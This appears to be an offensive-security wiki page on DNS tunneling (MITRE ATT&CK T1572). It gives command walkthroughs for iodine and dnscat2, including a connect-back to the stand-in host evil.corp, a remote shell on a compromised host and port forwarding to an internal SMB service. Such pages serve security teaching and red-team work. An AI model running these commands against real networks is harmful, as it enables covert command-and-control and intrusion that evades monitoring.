---
description: MITRE ATT&CK™ Protocol Tunneling  - Technique T1572
---

# DNS Tunneling

## Theory

DNS Tunneling also known as **TCP over DNS**, is another method used for covert communication and circumventing network security measures. In DNS tunneling, data is encoded in DNS queries and responses to create a communication channel between two endpoints. DNS, which is primarily designed for translating domain names to IP addresses, becomes a carrier for data that may not be related to traditional domain resolution.

{% hint style="danger" %}
DNS tunneling may also be used as an [exfiltration](../exfiltration/dns.md) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="iodine" %}
[iodine](https://github.com/yarrick/iodine) is a C software that lets you tunnel IPv4 data through a DNS server.\
On the attacking machine we can run the server:

```bash
v4resk@kali$ sudo iodined -f -c -P password 10.1.1.1/24 my.attackingDnsServer.com    
```

On the compromised host, the jumpbox, we will setup the iodine client:

```bash
victim@pwnd.lab$ sudo iodine -P password my.dnsServer.com     
```

Now the attacking machine and the compromised host are sending traffics throught the `dns0` interface. All communication over this interface on the network 10.1.1.1/24 will be over the DNS. We can then setup a socks5 proxy using the `-D` argument of ssh client.

```bash
veresk@kali$ ssh victim@10.1.1.2 -4 -D 1080 -Nf
```
{% endtab %}

{% tab title="dnscat2" %}
{% hint style="info" %}
We consider that an authoritative DNS server for `evil.corp` has been registered and is pointing the Attacking IP hosting the dnscat2 server. But we can also perform this tunneling technique whitout a domain.&#x20;
{% endhint %}

We can use [dnscat2](https://github.com/iagox86/dnscat2) to infiltrate data using DNS with TXT (and other) records. First on the attacking host, we can start the dnscat server as follow

```bash
dnscat2-server evil.corp
```

On the target run one of the following commands to connect back to the server

```bash
# Connect if server is an authoritative DNS server.
./dnscat evil.corp

# talk directly to the server without a domain name
./dnscat --dns server=x.x.x.x,port=53
```

We can start interacting with the target from our dncatserver

```bash
# List sessions
dnscat2> windows

# Select a session
dnscat2> window -i <SESSION_ID>

# We can:
## Get a shell from a session
command (pwnedHost) 1> shell
[Ctrl+Z]

dnscat2> window -i <SHELL_SESSION_ID>
sh (pwnedHost) 2> whoami
sh (pwnedHost) 2> user01

## Do a port forward from a session
#<DNSCAT_SRV_LOCAL_IP>:<DNSCAT_SRV_LOCAL_PORT> <REMOTE_IP>:<REMOTE_PORT>
command (pwnedHost) 1> listen 127.0.0.1:4455 10.10.12.11:445 
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
